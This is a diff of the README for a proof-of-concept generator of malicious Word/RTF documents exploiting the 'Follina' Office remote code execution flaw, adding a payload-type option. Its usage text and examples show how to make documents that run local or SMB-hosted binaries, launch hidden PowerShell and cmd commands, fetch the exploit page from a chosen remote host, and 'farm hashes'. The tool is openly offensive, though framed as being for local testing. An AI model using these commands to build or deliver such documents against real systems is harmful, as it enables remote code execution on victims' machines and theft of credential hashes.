@@ -7,49 +7,51 @@ Quick POC to replicate the 'Follina' Office RCE vulnerability for local testing 
 ## Usage:
 
 ```
-python .\follina.py -h
-usage: follina.py [-h] -m {command,binary} [-b BINARY] [-c COMMAND] [-u URL] [-H HOST] [-p PORT]
-
 options:
   -h, --help            show this help message and exit
 
 Required Arguments:
-  -m {command,binary}, --mode {command,binary}
-                        Execution mode, can be "binary" to load a (remote) binary, or "command" to run an encoded PS command
+  -t {docx,rtf}, --type {docx,rtf}
+                        Choose type of payload (RTF, DOCX)
+  -m {binary,command}, --mode {binary,command}
+                        Execution mode, can be "binary" to load a (remote) binary, or "command" to run an encoded PS
+                        command
 
 Binary Execution Arguments:
   -b BINARY, --binary BINARY
+                        The full path of the binary to run. Can be local or remote from an SMB share
 
 Command Execution Arguments:
   -c COMMAND, --command COMMAND
                         The encoded command to execute in "command" mode
 
 Optional Arguments:
-  -u URL, --url URL     The hostname or IP address where the generated document should retrieve your payload, defaults to "localhost"
+  -u URL, --url URL     The hostname or IP address where the generated document should retrieve your payload, defaults
+                        to "localhost"
   -H HOST, --host HOST  The interface for the web server to listen on, defaults to all interfaces (0.0.0.0)
-  -p PORT, --port PORT  The port to run the HTTP server on, defaults to 80
+  -P PORT, --port PORT  The port to run the HTTP server on, defaults to 80
 ```
 
 ## Examples:
 
 ```
 # Execute a local binary
-python .\follina.py -m binary -b \windows\system32\calc.exe
+python .\follina.py -t docx -m binary -b \windows\system32\calc.exe
 
 # On linux you may have to escape backslashes
-python .\follina.py -m binary -b \\windows\\system32\\calc.exe
+python .\follina.py -t rtf -m binary -b \\windows\\system32\\calc.exe
 
 # Execute a binary from a file share (can be used to farm hashes 👀)
-python .\follina.py -m binary -b \\localhost\c$\windows\system32\calc.exe
+python .\follina.py -t rtf -m binary -b \\localhost\c$\windows\system32\calc.exe
 
 # Execute an arbitrary powershell command
-python .\follina.py -m command -c "Start-Process c:\windows\system32\cmd.exe -WindowStyle hidden -ArgumentList '/c echo owned > c:\users\public\owned.txt'"
+python .\follina.py -t docx -m command -c "Start-Process c:\windows\system32\cmd.exe -WindowStyle hidden -ArgumentList '/c echo owned > c:\users\public\owned.txt'"
 
 # Run the web server on the default interface (all interfaces, 0.0.0.0), but tell the malicious document to retrieve it at http://1.2.3.4/exploit.html
-python .\follina.py -m binary -b \windows\system32\calc.exe -u 1.2.3.4
+python .\follina.py -t docx -m binary -b \windows\system32\calc.exe -u 1.2.3.4
 
 # Only run the webserver on localhost, on port 8080 instead of 80
-python .\follina.py -m binary -b \windows\system32\calc.exe -H 127.0.0.1 -P 8080
+python .\follina.py -t rtf -m binary -b \windows\system32\calc.exe -H 127.0.0.1 -P 8080
 ```
 
 ## Cool peeps
